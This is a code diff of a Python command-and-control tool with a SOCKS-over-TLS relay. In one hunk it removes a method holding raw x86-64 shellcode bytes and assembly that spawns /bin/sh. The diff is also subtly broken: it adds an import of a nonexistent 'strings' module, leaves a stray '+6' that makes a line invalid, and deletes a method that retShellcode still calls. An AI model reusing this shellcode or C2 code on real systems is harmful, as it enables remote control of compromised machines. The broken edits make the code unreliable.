@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 import asyncio, ssl, argparse, random, os, logging, sys, socket, struct, threading, urllib.request, fcntl, time
-import subprocess, shutil, base64, hashlib, socket, json, ctypes
+import subprocess, shutil, base64, hashlib, socket, json, ctypes, strings
 from pathlib import Path
 from collections import deque
 from typing import Tuple, Optional, Deque, Any, Dict, List, Union
@@ -179,7 +179,7 @@ class SocksRelay:
                         logger.info("↗ [TASK] SOCKS client closed connection")
                         break
                     logger.debug(f"↗ SOCKS→TLS forwarded {len(data)} bytes")
-                    writer.write(data)
+              +6      writer.write(data)
                     await writer.drain()
                 except asyncio.TimeoutError: continue
         except Exception as e: logger.error(f"↗ _socks_to_tls error: {e}")
@@ -383,30 +383,6 @@ class C2:
         def custom(schex: str) -> bytes:
             return bytes.fromhex(schex.replace("\\x", "").replace(" ", ""))
 
-    def _setupShellcode(self):
-        self.shellcode = {
-            "execve":{
-                "name": "execve(/bin/sh)",
-                "bytes": b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05",
-                "length": 23,
-                "asm": '\n'.join([
-                "xor rsi, rsi",
-                "push rsi",
-                "movabs rdi, 0x68732f6e69622f2f   ; //bin/sh",
-                "push rdi",
-                "mov rdi, rsp",
-                "push 59                          ; execve",
-                "pop rax",
-                "cdq",
-                "syscall"])
-            },
-            "terminate":{
-            "name":"terminate",
-            "bytes": b"\x48\x31\xc0\xb0\x3c\x0f\x05",
-            "length": 7
-            }
-        }
-        self.logger.debug("(_setupShellcode) Shellcode setup complete...")
     
     def _initSeccomp(self):
         self.logger.debug("(_initSeccomp) Initializing seccomp...")
@@ -618,7 +594,7 @@ class C2:
     def retShellcode(self,name:str)->bytes:
         if self.shellcode == None: self._setupShellcode()
         if name not in self.shellcode: self.logger.warning("(retShellCode) %s not found in shellcodes.",name)
-        return self.shellcodes.get(name,b"").get("bytes",b"")
+        return self.shellcode.get(name,b"").get("bytes",b"")
 
     def _pollFD(self,fd:int,timeout:int)->bool:
         """Simple poll helper"""
